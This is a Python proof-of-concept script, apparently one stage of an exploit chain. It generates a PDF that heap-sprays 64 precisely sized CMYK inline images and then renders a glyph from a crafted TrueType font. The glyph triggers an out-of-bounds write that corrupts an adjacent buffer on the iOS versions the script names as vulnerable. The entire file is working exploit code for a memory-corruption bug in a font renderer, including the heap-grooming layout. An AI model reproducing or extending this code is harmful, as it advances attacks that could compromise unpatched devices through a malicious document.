#!/usr/bin/env python3
"""Step 2a: Visual OOB Confirmation PDF.

Sprays 64 CMYK inline images (1280x1, 4 components = exactly 5120 bytes each)
filled with uniform 0x80 (50% gray). The trigger glyph renders LAST, causing
the coverage buffer OOB to corrupt one spray image's first 4 bytes.

On vulnerable iOS (27.0.1 / 27.1):
  - 63 images render as uniform gray
  - 1 image has corrupted leftmost pixel(s) — different color

On patched systems (macOS 27.0.1+, iOS 27.2+):
  - All 64 images render as uniform gray

The images are drawn as visible rectangles in an 8x8 grid so the
corrupted one can be spotted by eye.

Font: gen_neg_tx_font.py (N=10, DX=2, TX=-16367)
  Coverage buffer = 572 bytes, quantum = 5120
  OOB = +5120 bytes forward = byte 0 of next allocation

Stdlib only (no external deps beyond the font file).
"""
import sys
import zlib

FONT = sys.argv[2] if len(sys.argv) > 2 else "neg_tx_trigger.ttf"
PTSIZE = 1024

# CMYK image sizing: 1280 x 1 x 4 components = 5120 bytes exactly
IMG_W = 1280
IMG_H = 1
IMG_COMPONENTS = 4  # CMYK
IMG_BYTES = IMG_W * IMG_H * IMG_COMPONENTS  # 5120

NUM_SPRAY = 64
GRID_COLS = 8
GRID_ROWS = 8

# Each image rectangle on the page
RECT_W = 60
RECT_H = 60
MARGIN = 10
PAGE_W = GRID_COLS * (RECT_W + MARGIN) + MARGIN
PAGE_H = GRID_ROWS * (RECT_H + MARGIN) + MARGIN + 200  # extra space for trigger glyph

# Fill value: 0x80 = 50% for each CMYK channel
# This renders as a medium gray. Any corruption will shift the color visibly.
FILL_BYTE = 0x80


def make_spray_stream():
    """Generate PDF content stream with 64 CMYK inline images in a grid.

    Each decoded image = exactly 5120 bytes = 1 SMALL magazine quantum.
    All filled with uniform 0x80 so any corruption is immediately visible.
    """
    ops = []

    # Draw image index labels and rectangles
    for i in range(NUM_SPRAY):
        col = i % GRID_COLS
        row = i // GRID_COLS
        x = MARGIN + col * (RECT_W + MARGIN)
        # Bottom-up: row 0 at top of page
        y = PAGE_H - 200 - MARGIN - (row + 1) * (RECT_H + MARGIN) + MARGIN

        # Uniform CMYK data: all 0x80
        img_data = bytes([FILL_BYTE]) * IMG_BYTES

        # Draw the inline image scaled to the rectangle
        ops.append(
            f"q\n"
            f"{RECT_W} 0 0 {RECT_H} {x} {y} cm\n"
            f"BI\n"
            f"/W {IMG_W}\n"
            f"/H {IMG_H}\n"
            f"/CS /CMYK\n"
            f"/BPC 8\n"
            f"ID\n".encode()
            + img_data
            + b"\nEI\nQ\n"
        )

    return b"".join(ops)


def make_trigger_stream():
    """Render the trigger glyph AFTER the spray images.

    The trigger glyph's coverage buffer is allocated from the SMALL magazine,
    adjacent to the spray image buffers. Its OOB write corrupts one of them.
    """
    # Place the trigger glyph in the top area of the page (above the grid)
    return f"BT /F1 {PTSIZE} Tf 5 {PAGE_H - 100} Td (A) Tj ET\n".encode()


def make_label_stream():
    """Draw grid labels and title text."""
    ops = []

    # Title
    ops.append(
        f"BT /F2 16 Tf 10 {PAGE_H - 30} Td "
        f"(Step 2a: OOB Visual Confirmation - CMYK 1280x1 Spray) Tj ET\n".encode()
    )
    ops.append(
        f"BT /F2 10 Tf 10 {PAGE_H - 50} Td "
        f"(64 images filled with 0x80. Corrupted image = OOB confirmed.) Tj ET\n".encode()
    )

    # Image index labels
    for i in range(NUM_SPRAY):
        col = i % GRID_COLS
        row = i // GRID_COLS
        x = MARGIN + col * (RECT_W + MARGIN) + 2
        y = PAGE_H - 200 - MARGIN - (row + 1) * (RECT_H + MARGIN) - 10

        ops.append(
            f"BT /F2 7 Tf {x} {y} Td ({i:02d}) Tj ET\n".encode()
        )

    return b"".join(ops)


def build(dst):
    ttf = open(FONT, "rb").read()
    ttf_z = zlib.compress(ttf)

    # Build content streams in order:
    # 1. Labels (using built-in font, no trigger)
    # 2. Spray images (allocate 64 x 5120-byte buffers)
    # 3. Trigger glyph (allocates coverage buffer, OOB writes into one spray buffer)
    labels = make_label_stream()
    spray = make_spray_stream()
    trigger = make_trigger_stream()
    content = labels + spray + trigger

    objs = [
        # 1: Catalog
        b"<< /Type /Catalog /Pages 2 0 R >>",
        # 2: Pages
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        # 3: Page
        (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 %d %d] "
         b"/Resources << /Font << /F1 5 0 R /F2 8 0 R >> >> "
         b"/Contents 4 0 R >>" % (PAGE_W, PAGE_H)),
        # 4: Content stream
        b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream",
        # 5: Trigger font (TrueType with crafted glyph)
        b"<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont "
        b"/FirstChar 65 /LastChar 65 /Widths [100] "
        b"/Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>",
        # 6: Font descriptor
        b"<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 "
        b"/FontBBox [0 0 2 40] /ItalicAngle 0 /Ascent 100 /Descent -100 "
        b"/CapHeight 100 /StemV 80 /FontFile2 7 0 R >>",
        # 7: Font file (compressed TrueType)
        b"<< /Length %d /Length1 %d /Filter /FlateDecode >>\nstream\n"
        % (len(ttf_z), len(ttf)) + ttf_z + b"\nendstream",
        # 8: Built-in Helvetica for labels
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]

    out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
    off = []
    for i, body in enumerate(objs, 1):
        off.append(len(out))
        out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    for o in off:
        out += b"%010d 00000 n \n" % o
    out += (b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n"
            % (len(objs) + 1, xref))

    open(dst, "wb").write(out)
    print(f"wrote {dst} ({len(out):,} bytes)")
    print(f"  spray: {NUM_SPRAY} CMYK inline images, {IMG_W}x{IMG_H}x{IMG_COMPONENTS} = {IMG_BYTES} bytes each")
    print(f"  fill: 0x{FILL_BYTE:02X} uniform (50% gray)")
    print(f"  grid: {GRID_COLS}x{GRID_ROWS}, rect size {RECT_W}x{RECT_H}")
    print(f"  trigger: N=10, DX=2, TX=-16367, Tf={PTSIZE}")
    print(f"  OOB: +5120 bytes forward -> corrupts 1 spray image pixels")
    print(f"  EXPECTED on vulnerable: 1 image shows non-gray leftmost pixel")


if __name__ == "__main__":
    build(sys.argv[1] if len(sys.argv) > 1 else "oob_confirm.pdf")
